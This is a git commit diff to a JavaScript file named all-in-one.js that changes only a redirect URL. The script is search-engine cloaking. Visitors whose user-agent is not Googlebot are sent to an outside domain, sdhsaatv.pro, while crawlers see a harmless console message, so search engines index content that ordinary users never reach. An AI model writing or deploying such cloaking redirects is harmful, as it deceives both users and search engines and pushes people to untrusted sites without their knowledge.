62a247bf289d3cdb698421b50c9c1041ea9fa81a
adaralove <adara.love@aol.com>
2026-09-14 23:09:00 +0600

    Update all-in-one.js

--- cst/video/all-in-one.js
+++ cst/video/all-in-one.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://sdhsaatv.pro/f1/?ALL";
+  window.location.href = "https://sdhsaatv.pro/sports/";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
